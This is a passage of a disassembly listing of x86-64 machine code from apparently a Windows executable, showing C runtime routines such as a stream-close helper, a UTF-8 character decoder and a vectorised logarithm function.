   14000bf48:	48 c1 f9 06          	sar    $0x6,%rcx
   14000bf4c:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000bf50:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000bf54:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000bf59:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000bf5e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000bf63:	48 83 c4 20          	add    $0x20,%rsp
   14000bf67:	5f                   	pop    %rdi
   14000bf68:	c3                   	ret
   14000bf69:	cc                   	int3
   14000bf6a:	cc                   	int3
   14000bf6b:	cc                   	int3
   14000bf6c:	e9 5f ff ff ff       	jmp    0x14000bed0
   14000bf71:	cc                   	int3
   14000bf72:	cc                   	int3
   14000bf73:	cc                   	int3
   14000bf74:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000bf79:	48 83 ec 28          	sub    $0x28,%rsp
   14000bf7d:	e8 9a 08 00 00       	call   0x14000c81c
   14000bf82:	85 c0                	test   %eax,%eax
   14000bf84:	74 1f                	je     0x14000bfa5
   14000bf86:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000bf8b:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bf90:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000bf95:	e8 f2 08 00 00       	call   0x14000c88c
   14000bf9a:	85 c0                	test   %eax,%eax
   14000bf9c:	74 07                	je     0x14000bfa5
   14000bf9e:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000bfa3:	eb 05                	jmp    0x14000bfaa
   14000bfa5:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000bfaa:	48 83 c4 28          	add    $0x28,%rsp
   14000bfae:	c3                   	ret
   14000bfaf:	cc                   	int3
   14000bfb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000bfb5:	57                   	push   %rdi
   14000bfb6:	48 83 ec 20          	sub    $0x20,%rsp
   14000bfba:	48 8b d9             	mov    %rcx,%rbx
   14000bfbd:	48 85 c9             	test   %rcx,%rcx
   14000bfc0:	75 15                	jne    0x14000bfd7
   14000bfc2:	e8 f9 97 ff ff       	call   0x1400057c0
   14000bfc7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000bfcd:	e8 ce 96 ff ff       	call   0x1400056a0
   14000bfd2:	83 c8 ff             	or     $0xffffffff,%eax
   14000bfd5:	eb 51                	jmp    0x14000c028
   14000bfd7:	8b 41 14             	mov    0x14(%rcx),%eax
   14000bfda:	83 cf ff             	or     $0xffffffff,%edi
   14000bfdd:	c1 e8 0d             	shr    $0xd,%eax
   14000bfe0:	a8 01                	test   $0x1,%al
   14000bfe2:	74 3a                	je     0x14000c01e
   14000bfe4:	e8 9f d2 ff ff       	call   0x140009288
   14000bfe9:	48 8b cb             	mov    %rbx,%rcx
   14000bfec:	8b f8                	mov    %eax,%edi
   14000bfee:	e8 ed f6 ff ff       	call   0x14000b6e0
   14000bff3:	48 8b cb             	mov    %rbx,%rcx
   14000bff6:	e8 e1 d6 ff ff       	call   0x1400096dc
   14000bffb:	8b c8                	mov    %eax,%ecx
   14000bffd:	e8 be 09 00 00       	call   0x14000c9c0
   14000c002:	85 c0                	test   %eax,%eax
   14000c004:	79 05                	jns    0x14000c00b
   14000c006:	83 cf ff             	or     $0xffffffff,%edi
   14000c009:	eb 13                	jmp    0x14000c01e
   14000c00b:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000c00f:	48 85 c9             	test   %rcx,%rcx
   14000c012:	74 0a                	je     0x14000c01e
   14000c014:	e8 3f 98 ff ff       	call   0x140005858
   14000c019:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000c01e:	48 8b cb             	mov    %rbx,%rcx
   14000c021:	e8 fe 0a 00 00       	call   0x14000cb24
   14000c026:	8b c7                	mov    %edi,%eax
   14000c028:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000c02d:	48 83 c4 20          	add    $0x20,%rsp
   14000c031:	5f                   	pop    %rdi
   14000c032:	c3                   	ret
   14000c033:	cc                   	int3
   14000c034:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000c039:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000c03e:	57                   	push   %rdi
   14000c03f:	48 83 ec 20          	sub    $0x20,%rsp
   14000c043:	48 8b d9             	mov    %rcx,%rbx
   14000c046:	48 85 c9             	test   %rcx,%rcx
   14000c049:	75 1e                	jne    0x14000c069
   14000c04b:	e8 70 97 ff ff       	call   0x1400057c0
   14000c050:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000c056:	e8 45 96 ff ff       	call   0x1400056a0
   14000c05b:	83 c8 ff             	or     $0xffffffff,%eax
   14000c05e:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000c063:	48 83 c4 20          	add    $0x20,%rsp
   14000c067:	5f                   	pop    %rdi
   14000c068:	c3                   	ret
   14000c069:	8b 41 14             	mov    0x14(%rcx),%eax
   14000c06c:	c1 e8 0c             	shr    $0xc,%eax
   14000c06f:	a8 01                	test   $0x1,%al
   14000c071:	74 07                	je     0x14000c07a
   14000c073:	e8 ac 0a 00 00       	call   0x14000cb24
   14000c078:	eb e1                	jmp    0x14000c05b
   14000c07a:	e8 55 d4 ff ff       	call   0x1400094d4
   14000c07f:	90                   	nop
   14000c080:	48 8b cb             	mov    %rbx,%rcx
   14000c083:	e8 28 ff ff ff       	call   0x14000bfb0
   14000c088:	8b f8                	mov    %eax,%edi
   14000c08a:	48 8b cb             	mov    %rbx,%rcx
   14000c08d:	e8 4e d4 ff ff       	call   0x1400094e0
   14000c092:	8b c7                	mov    %edi,%eax
   14000c094:	eb c8                	jmp    0x14000c05e
   14000c096:	cc                   	int3
   14000c097:	cc                   	int3
   14000c098:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000c09d:	55                   	push   %rbp
   14000c09e:	56                   	push   %rsi
   14000c09f:	57                   	push   %rdi
   14000c0a0:	41 56                	push   %r14
   14000c0a2:	41 57                	push   %r15
   14000c0a4:	48 83 ec 40          	sub    $0x40,%rsp
   14000c0a8:	48 8b 05 79 af 00 00 	mov    0xaf79(%rip),%rax        # 0x140017028
   14000c0af:	48 33 c4             	xor    %rsp,%rax
   14000c0b2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000c0b7:	45 33 d2             	xor    %r10d,%r10d
   14000c0ba:	4c 8d 1d af c5 00 00 	lea    0xc5af(%rip),%r11        # 0x140018670
   14000c0c1:	4d 85 c9             	test   %r9,%r9
   14000c0c4:	48 8d 3d 07 2a 00 00 	lea    0x2a07(%rip),%rdi        # 0x14000ead2
   14000c0cb:	48 8b c2             	mov    %rdx,%rax
   14000c0ce:	4c 8b fa             	mov    %rdx,%r15
   14000c0d1:	4d 0f 45 d9          	cmovne %r9,%r11
   14000c0d5:	48 85 d2             	test   %rdx,%rdx
   14000c0d8:	41 8d 6a 01          	lea    0x1(%r10),%ebp
   14000c0dc:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000c0e0:	44 8b f5             	mov    %ebp,%r14d
   14000c0e3:	4d 0f 45 f0          	cmovne %r8,%r14
   14000c0e7:	48 f7 d8             	neg    %rax
   14000c0ea:	48 1b f6             	sbb    %rsi,%rsi
   14000c0ed:	48 23 f1             	and    %rcx,%rsi
   14000c0f0:	4d 85 f6             	test   %r14,%r14
   14000c0f3:	75 0c                	jne    0x14000c101
   14000c0f5:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000c0fc:	e9 4e 01 00 00       	jmp    0x14000c24f
   14000c101:	66 45 39 53 06       	cmp    %r10w,0x6(%r11)
   14000c106:	75 68                	jne    0x14000c170
   14000c108:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000c10c:	48 ff c7             	inc    %rdi
   14000c10f:	45 84 c9             	test   %r9b,%r9b
   14000c112:	78 17                	js     0x14000c12b
   14000c114:	48 85 f6             	test   %rsi,%rsi
   14000c117:	74 03                	je     0x14000c11c
   14000c119:	44 89 0e             	mov    %r9d,(%rsi)
   14000c11c:	45 84 c9             	test   %r9b,%r9b
   14000c11f:	41 0f 95 c2          	setne  %r10b
   14000c123:	49 8b c2             	mov    %r10,%rax
   14000c126:	e9 24 01 00 00       	jmp    0x14000c24f
   14000c12b:	41 8a c1             	mov    %r9b,%al
   14000c12e:	24 e0                	and    $0xe0,%al
   14000c130:	3c c0                	cmp    $0xc0,%al
   14000c132:	75 05                	jne    0x14000c139
   14000c134:	41 b0 02             	mov    $0x2,%r8b
   14000c137:	eb 1e                	jmp    0x14000c157
   14000c139:	41 8a c1             	mov    %r9b,%al
   14000c13c:	24 f0                	and    $0xf0,%al
   14000c13e:	3c e0                	cmp    $0xe0,%al
   14000c140:	75 05                	jne    0x14000c147
   14000c142:	41 b0 03             	mov    $0x3,%r8b
   14000c145:	eb 10                	jmp    0x14000c157
   14000c147:	41 8a c1             	mov    %r9b,%al
   14000c14a:	24 f8                	and    $0xf8,%al
   14000c14c:	3c f0                	cmp    $0xf0,%al
   14000c14e:	0f 85 e9 00 00 00    	jne    0x14000c23d
   14000c154:	41 b0 04             	mov    $0x4,%r8b
   14000c157:	41 0f b6 c0          	movzbl %r8b,%eax
   14000c15b:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000c160:	2b c8                	sub    %eax,%ecx
   14000c162:	8b d5                	mov    %ebp,%edx
   14000c164:	d3 e2                	shl    %cl,%edx
   14000c166:	41 8a d8             	mov    %r8b,%bl
   14000c169:	2b d5                	sub    %ebp,%edx
   14000c16b:	41 23 d1             	and    %r9d,%edx
   14000c16e:	eb 29                	jmp    0x14000c199
   14000c170:	45 8a 43 04          	mov    0x4(%r11),%r8b
   14000c174:	41 8b 13             	mov    (%r11),%edx
   14000c177:	41 8a 5b 06          	mov    0x6(%r11),%bl
   14000c17b:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000c17f:	3c 02                	cmp    $0x2,%al
   14000c181:	0f 87 b6 00 00 00    	ja     0x14000c23d
   14000c187:	40 3a dd             	cmp    %bpl,%bl
   14000c18a:	0f 82 ad 00 00 00    	jb     0x14000c23d
   14000c190:	41 3a d8             	cmp    %r8b,%bl
   14000c193:	0f 83 a4 00 00 00    	jae    0x14000c23d
   14000c199:	0f b6 eb             	movzbl %bl,%ebp
   14000c19c:	49 3b ee             	cmp    %r14,%rbp
   14000c19f:	44 8b cd             	mov    %ebp,%r9d
   14000c1a2:	4d 0f 43 ce          	cmovae %r14,%r9
   14000c1a6:	eb 1e                	jmp    0x14000c1c6
   14000c1a8:	0f b6 0f             	movzbl (%rdi),%ecx
   14000c1ab:	48 ff c7             	inc    %rdi
   14000c1ae:	8a c1                	mov    %cl,%al
   14000c1b0:	24 c0                	and    $0xc0,%al
   14000c1b2:	3c 80                	cmp    $0x80,%al
   14000c1b4:	0f 85 83 00 00 00    	jne    0x14000c23d
   14000c1ba:	8b c2                	mov    %edx,%eax
   14000c1bc:	83 e1 3f             	and    $0x3f,%ecx
   14000c1bf:	c1 e0 06             	shl    $0x6,%eax
   14000c1c2:	8b d1                	mov    %ecx,%edx
   14000c1c4:	0b d0                	or     %eax,%edx
   14000c1c6:	48 8b c7             	mov    %rdi,%rax
   14000c1c9:	49 2b c7             	sub    %r15,%rax
   14000c1cc:	49 3b c1             	cmp    %r9,%rax
   14000c1cf:	72 d7                	jb     0x14000c1a8
   14000c1d1:	4c 3b cd             	cmp    %rbp,%r9
   14000c1d4:	73 1c                	jae    0x14000c1f2
   14000c1d6:	41 0f b6 c0          	movzbl %r8b,%eax
   14000c1da:	41 2a d9             	sub    %r9b,%bl
   14000c1dd:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   14000c1e2:	0f b6 c3             	movzbl %bl,%eax
   14000c1e5:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   14000c1ea:	41 89 13             	mov    %edx,(%r11)
   14000c1ed:	e9 03 ff ff ff       	jmp    0x14000c0f5
   14000c1f2:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000c1f8:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000c1fd:	76 3e                	jbe    0x14000c23d
   14000c1ff:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000c205:	73 36                	jae    0x14000c23d
   14000c207:	41 0f b6 c0          	movzbl %r8b,%eax
   14000c20b:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000c212:	00 
   14000c213:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000c21a:	00 
   14000c21b:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000c222:	00 
   14000c223:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000c227:	72 14                	jb     0x14000c23d
   14000c229:	48 85 f6             	test   %rsi,%rsi
   14000c22c:	74 02                	je     0x14000c230
   14000c22e:	89 16                	mov    %edx,(%rsi)
   14000c230:	f7 da                	neg    %edx
   14000c232:	4d 89 13             	mov    %r10,(%r11)
   14000c235:	48 1b c0             	sbb    %rax,%rax
   14000c238:	48 23 c5             	and    %rbp,%rax
   14000c23b:	eb 12                	jmp    0x14000c24f
   14000c23d:	4d 89 13             	mov    %r10,(%r11)
   14000c240:	e8 7b 95 ff ff       	call   0x1400057c0
   14000c245:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000c24b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000c24f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000c254:	48 33 cc             	xor    %rsp,%rcx
   14000c257:	e8 94 11 00 00       	call   0x14000d3f0
   14000c25c:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000c261:	48 83 c4 40          	add    $0x40,%rsp
   14000c265:	41 5f                	pop    %r15
   14000c267:	41 5e                	pop    %r14
   14000c269:	5f                   	pop    %rdi
   14000c26a:	5e                   	pop    %rsi
   14000c26b:	5d                   	pop    %rbp
   14000c26c:	c3                   	ret
   14000c26d:	cc                   	int3
   14000c26e:	cc                   	int3
   14000c26f:	cc                   	int3
   14000c270:	48 83 ec 58          	sub    $0x58,%rsp
   14000c274:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000c27a:	83 3d fb c3 00 00 00 	cmpl   $0x0,0xc3fb(%rip)        # 0x14001867c
   14000c281:	0f 85 e9 02 00 00    	jne    0x14000c570
   14000c287:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c28b:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c28f:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000c294:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000c299:	66 0f fb 1d bf 78 00 	psubq  0x78bf(%rip),%xmm3        # 0x140013b60
   14000c2a0:	00 
   14000c2a1:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000c2a5:	66 0f 54 2d 83 78 00 	andpd  0x7883(%rip),%xmm5        # 0x140013b30
   14000c2ac:	00 
   14000c2ad:	66 0f 2f 2d 7b 78 00 	comisd 0x787b(%rip),%xmm5        # 0x140013b30
   14000c2b4:	00 
   14000c2b5:	0f 84 85 02 00 00    	je     0x14000c540
   14000c2bb:	66 0f 28 d0          	movapd %xmm0,%xmm2
   14000c2bf:	f3 0f e6 f3          	cvtdq2pd %xmm3,%xmm6
   14000c2c3:	66 0f 57 ed          	xorpd  %xmm5,%xmm5
   14000c2c7:	66 0f 2f c5          	comisd %xmm5,%xmm0
   14000c2cb:	0f 86 2f 02 00 00    	jbe    0x14000c500
   14000c2d1:	66 0f db 15 a7 78 00 	pand   0x78a7(%rip),%xmm2        # 0x140013b80
   14000c2d8:	00 
   14000c2d9:	f2 0f 5c 25 2f 79 00 	subsd  0x792f(%rip),%xmm4        # 0x140013c10
   14000c2e0:	00 
   14000c2e1:	66 0f 2f 35 b7 79 00 	comisd 0x79b7(%rip),%xmm6        # 0x140013ca0
   14000c2e8:	00 
   14000c2e9:	0f 84 d8 01 00 00    	je     0x14000c4c7
   14000c2ef:	66 0f 54 25 09 7a 00 	andpd  0x7a09(%rip),%xmm4        # 0x140013d00
   14000c2f6:	00 
   14000c2f7:	4c 8b c8             	mov    %rax,%r9
   14000c2fa:	48 23 05 8f 78 00 00 	and    0x788f(%rip),%rax        # 0x140013b90
   14000c301:	4c 23 0d 98 78 00 00 	and    0x7898(%rip),%r9        # 0x140013ba0
   14000c308:	49 d1 e1             	shl    $1,%r9
   14000c30b:	49 03 c1             	add    %r9,%rax
   14000c30e:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000c313:	66 0f 2f 25 a5 79 00 	comisd 0x79a5(%rip),%xmm4        # 0x140013cc0
   14000c31a:	00 
   14000c31b:	0f 82 df 00 00 00    	jb     0x14000c400
   14000c321:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c325:	66 0f eb 15 f3 78 00 	por    0x78f3(%rip),%xmm2        # 0x140013c20
   14000c32c:	00 
   14000c32d:	66 0f eb 0d eb 78 00 	por    0x78eb(%rip),%xmm1        # 0x140013c20
   14000c334:	00 
   14000c335:	4c 8d 0d 64 8a 00 00 	lea    0x8a64(%rip),%r9        # 0x140014da0
   14000c33c:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   14000c340:	f2 41 0f 59 0c c1    	mulsd  (%r9,%rax,8),%xmm1
   14000c346:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c34a:	66 0f 28 c1          	movapd %xmm1,%xmm0
   14000c34e:	4c 8d 0d 2b 7a 00 00 	lea    0x7a2b(%rip),%r9        # 0x140013d80
   14000c355:	f2 0f 10 1d 33 79 00 	movsd  0x7933(%rip),%xmm3        # 0x140013c90
   14000c35c:	00 
   14000c35d:	f2 0f 10 0d fb 78 00 	movsd  0x78fb(%rip),%xmm1        # 0x140013c60
   14000c364:	00 
   14000c365:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c369:	f2 0f 59 ca          	mulsd  %xmm2,%xmm1
   14000c36d:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c371:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000c375:	f2 0f 58 1d 03 79 00 	addsd  0x7903(%rip),%xmm3        # 0x140013c80
   14000c37c:	00 
   14000c37d:	f2 0f 58 0d cb 78 00 	addsd  0x78cb(%rip),%xmm1        # 0x140013c50
   14000c384:	00 
   14000c385:	f2 0f 59 e0          	mulsd  %xmm0,%xmm4
   14000c389:	f2 0f 59 da          	mulsd  %xmm2,%xmm3
   14000c38d:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   14000c391:	f2 0f 58 1d d7 78 00 	addsd  0x78d7(%rip),%xmm3        # 0x140013c70
   14000c398:	00 
   14000c399:	f2 0f 58 ca          	addsd  %xmm2,%xmm1
   14000c39d:	f2 0f 59 dc          	mulsd  %xmm4,%xmm3
   14000c3a1:	f2 0f 58 cb          	addsd  %xmm3,%xmm1
   14000c3a5:	f2 0f 10 2d 43 78 00 	movsd  0x7843(%rip),%xmm5        # 0x140013bf0
   14000c3ac:	00 
   14000c3ad:	f2 0f 59 0d fb 77 00 	mulsd  0x77fb(%rip),%xmm1        # 0x140013bb0
   14000c3b4:	00 
   14000c3b5:	f2 0f 59 ee          	mulsd  %xmm6,%xmm5
   14000c3b9:	f2 0f 5c e9          	subsd  %xmm1,%xmm5
   14000c3bd:	f2 41 0f 10 04 c1    	movsd  (%r9,%rax,8),%xmm0
   14000c3c3:	48 8d 15 c6 81 00 00 	lea    0x81c6(%rip),%rdx        # 0x140014590
   14000c3ca:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   14000c3cf:	f2 0f 10 25 09 78 00 	movsd  0x7809(%rip),%xmm4        # 0x140013be0
   14000c3d6:	00 
   14000c3d7:	f2 0f 59 e6          	mulsd  %xmm6,%xmm4
   14000c3db:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c3df:	f2 0f 58 d5          	addsd  %xmm5,%xmm2
   14000c3e3:	f2 0f 58 c2          	addsd  %xmm2,%xmm0
   14000c3e7:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c3ed:	48 83 c4 58          	add    $0x58,%rsp
   14000c3f1:	c3                   	ret
   14000c3f2:	66 66 66 66 66 66 0f 	data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000c3f9:	1f 84 00 00 00 00 00 
   14000c400:	f2 0f 10 15 f8 77 00 	movsd  0x77f8(%rip),%xmm2        # 0x140013c00
   14000c407:	00 
   14000c408:	f2 0f 5c 05 00 78 00 	subsd  0x7800(%rip),%xmm0        # 0x140013c10
   14000c40f:	00 
   14000c410:	f2 0f 58 d0          	addsd  %xmm0,%xmm2
   14000c414:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000c418:	f2 0f 5e ca          	divsd  %xmm2,%xmm1
   14000c41c:	f2 0f 10 25 fc 78 00 	movsd  0x78fc(%rip),%xmm4        # 0x140013d20
   14000c423:	00 
   14000c424:	f2 0f 10 2d 14 79 00 	movsd  0x7914(%rip),%xmm5        # 0x140013d40
   14000c42b:	00 
   14000c42c:	66 0f 28 f0          	movapd %xmm0,%xmm6
   14000c430:	f2 0f 59 f1          	mulsd  %xmm1,%xmm6
   14000c434:	f2 0f 58 c9          	addsd  %xmm1,%xmm1
   14000c438:	66 0f 28 d1          	movapd %xmm1,%xmm2
   14000c43c:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c440:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c444:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c448:	f2 0f 58 25 c0 78 00 	addsd  0x78c0(%rip),%xmm4        # 0x140013d10
   14000c44f:	00 
   14000c450:	f2 0f 58 2d d8 78 00 	addsd  0x78d8(%rip),%xmm5        # 0x140013d30
   14000c457:	00 
   14000c458:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c45c:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c460:	f2 0f 59 d2          	mulsd  %xmm2,%xmm2
   14000c464:	f2 0f 59 d1          	mulsd  %xmm1,%xmm2
   14000c468:	f2 0f 59 ea          	mulsd  %xmm2,%xmm5
   14000c46c:	f2 0f 10 15 5c 77 00 	movsd  0x775c(%rip),%xmm2        # 0x140013bd0
   14000c473:	00 
   14000c474:	f2 0f 58 e5          	addsd  %xmm5,%xmm4
   14000c478:	f2 0f 5c e6          	subsd  %xmm6,%xmm4
   14000c47c:	f2 0f 10 35 3c 77 00 	movsd  0x773c(%rip),%xmm6        # 0x140013bc0
   14000c483:	00 
   14000c484:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000c488:	66 0f db 1d c0 78 00 	pand   0x78c0(%rip),%xmm3        # 0x140013d50
   14000c48f:	00 
   14000c490:	f2 0f 5c c3          	subsd  %xmm3,%xmm0
   14000c494:	f2 0f 58 e0          	addsd  %xmm0,%xmm4
   14000c498:	66 0f 28 c3          	movapd %xmm3,%xmm0
   14000c49c:	66 0f 28 cc          	movapd %xmm4,%xmm1
   14000c4a0:	f2 0f 59 e2          	mulsd  %xmm2,%xmm4
   14000c4a4:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   14000c4a8:	f2 0f 59 ce          	mulsd  %xmm6,%xmm1
   14000c4ac:	f2 0f 59 de          	mulsd  %xmm6,%xmm3
   14000c4b0:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
   14000c4b4:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   14000c4b8:	f2 0f 58 c3          	addsd  %xmm3,%xmm0
   14000c4bc:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c4c2:	48 83 c4 58          	add    $0x58,%rsp
   14000c4c6:	c3                   	ret
   14000c4c7:	66 0f eb 15 41 77 00 	por    0x7741(%rip),%xmm2        # 0x140013c10
   14000c4ce:	00 
   14000c4cf:	f2 0f 5c 15 39 77 00 	subsd  0x7739(%rip),%xmm2        # 0x140013c10
   14000c4d6:	00 
   14000c4d7:	f2 0f 10 ea          	movsd  %xmm2,%xmm5
   14000c4db:	66 0f db 15 9d 76 00 	pand   0x769d(%rip),%xmm2        # 0x140013b80
   14000c4e2:	00 
   14000c4e3:	66 48 0f 7e d0       	movq   %xmm2,%rax
   14000c4e8:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
   14000c4ed:	66 0f fa 2d bb 77 00 	psubd  0x77bb(%rip),%xmm5        # 0x140013cb0
   14000c4f4:	00 
   14000c4f5:	f3 0f e6 f5          	cvtdq2pd %xmm5,%xmm6
   14000c4f9:	e9 f1 fd ff ff       	jmp    0x14000c2ef
   14000c4fe:	66 90                	xchg   %ax,%ax
   14000c500:	75 1e                	jne    0x14000c520
   14000c502:	f2 0f 10 0d 16 76 00 	movsd  0x7616(%rip),%xmm1        # 0x140013b20
   14000c509:	00 
   14000c50a:	44 8b 05 4f 78 00 00 	mov    0x784f(%rip),%r8d        # 0x140013d60
   14000c511:	e8 ea 08 00 00       	call   0x14000ce00
   14000c516:	eb 48                	jmp    0x14000c560
   14000c518:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000c51f:	00 
   14000c520:	f2 0f 10 0d 18 76 00 	movsd  0x7618(%rip),%xmm1        # 0x140013b40
   14000c527:	00 
   14000c528:	44 8b 05 35 78 00 00 	mov    0x7835(%rip),%r8d        # 0x140013d64
   14000c52f:	e8 cc 08 00 00       	call   0x14000ce00
   14000c534:	eb 2a                	jmp    0x14000c560
   14000c536:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000c53d:	00 00 00 
   14000c540:	48 3b 05 e9 75 00 00 	cmp    0x75e9(%rip),%rax        # 0x140013b30
   14000c547:	74 17                	je     0x14000c560
   14000c549:	48 3b 05 d0 75 00 00 	cmp    0x75d0(%rip),%rax        # 0x140013b20
   14000c550:	74 ce                	je     0x14000c520
   14000c552:	48 0b 05 f7 75 00 00 	or     0x75f7(%rip),%rax        # 0x140013b50
   14000c559:	66 48 0f 6e c0       	movq   %rax,%xmm0
   14000c55e:	66 90                	xchg   %ax,%ax
   14000c560:	66 0f 6f 74 24 20    	movdqa 0x20(%rsp),%xmm6
   14000c566:	48 83 c4 58          	add    $0x58,%rsp
   14000c56a:	c3                   	ret
   14000c56b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000c570:	48 33 c0             	xor    %rax,%rax
   14000c573:	c5 e1 73 d0 34       	vpsrlq $0x34,%xmm0,%xmm3
   14000c578:	c4 e1 f9 7e c0       	vmovq  %xmm0,%rax
   14000c57d:	c5 e1 fb 1d db 75 00 	vpsubq 0x75db(%rip),%xmm3,%xmm3        # 0x140013b60
   14000c584:	00 
   14000c585:	c5 fa e6 f3          	vcvtdq2pd %xmm3,%xmm6
   14000c589:	c5 f9 db 2d 9f 75 00 	vpand  0x759f(%rip),%xmm0,%xmm5        # 0x140013b30
   14000c590:	00 
   14000c591:	c5 f9 2f 2d 97 75 00 	vcomisd 0x7597(%rip),%xmm5        # 0x140013b30
   14000c598:	00 
   14000c599:	0f 84 41 02 00 00    	je     0x14000c7e0
   14000c59f:	c5 d1 ef ed          	vpxor  %xmm5,%xmm5,%xmm5
   14000c5a3:	c5 f9 2f c5          	vcomisd %xmm5,%xmm0
   14000c5a7:	0f 86 e3 01 00 00    	jbe    0x14000c790
   14000c5ad:	c5 f9 db 15 cb 75 00 	vpand  0x75cb(%rip),%xmm0,%xmm2        # 0x140013b80
   14000c5b4:	00 
   14000c5b5:	c5 fb 5c 25 53 76 00 	vsubsd 0x7653(%rip),%xmm0,%xmm4        # 0x140013c10
   14000c5bc:	00 
   14000c5bd:	c5 f9 2f 35 db 76 00 	vcomisd 0x76db(%rip),%xmm6        # 0x140013ca0
   14000c5c4:	00 
   14000c5c5:	0f 84 8e 01 00 00    	je     0x14000c759
   14000c5cb:	c5 f9 db 0d bd 75 00 	vpand  0x75bd(%rip),%xmm0,%xmm1        # 0x140013b90
   14000c5d2:	00 
   14000c5d3:	c5 f9 db 1d c5 75 00 	vpand  0x75c5(%rip),%xmm0,%xmm3        # 0x140013ba0
   14000c5da:	00 
   14000c5db:	c5 e1 73 f3 01       	vpsllq $0x1,%xmm3,%xmm3
   14000c5e0:	c5 e1 d4 c9          	vpaddq %xmm1,%xmm3,%xmm1
   14000c5e4:	c4 e1 f9 7e c8       	vmovq  %xmm1,%rax
   14000c5e9:	c5 d9 db 25 0f 77 00 	vpand  0x770f(%rip),%xmm4,%xmm4        # 0x140013d00
   14000c5f0:	00 
   14000c5f1:	c5 f9 2f 25 c7 76 00 	vcomisd 0x76c7(%rip),%xmm4        # 0x140013cc0
   14000c5f8:	00 
   14000c5f9:	0f 82 b1 00 00 00    	jb     0x14000c6b0
   14000c5ff:	48 c1 e8 2c          	shr    $0x2c,%rax
   14000c603:	c5 e9 eb 15 15 76 00 	vpor   0x7615(%rip),%xmm2,%xmm2        # 0x140013c20
   14000c60a:	00 
   14000c60b:	c5 f1 eb 0d 0d 76 00 	vpor   0x760d(%rip),%xmm1,%xmm1        # 0x140013c20
   14000c612:	00 
   14000c613:	4c 8d 0d 86 87 00 00 	lea    0x8786(%rip),%r9        # 0x140014da0
   14000c61a:	c5 f3 5c ca          	vsubsd %xmm2,%xmm1,%xmm1
   14000c61e:	c4 c1 73 59 0c c1    	vmulsd (%r9,%rax,8),%xmm1,%xmm1
   14000c624:	4c 8d 0d 55 77 00 00 	lea    0x7755(%rip),%r9        # 0x140013d80
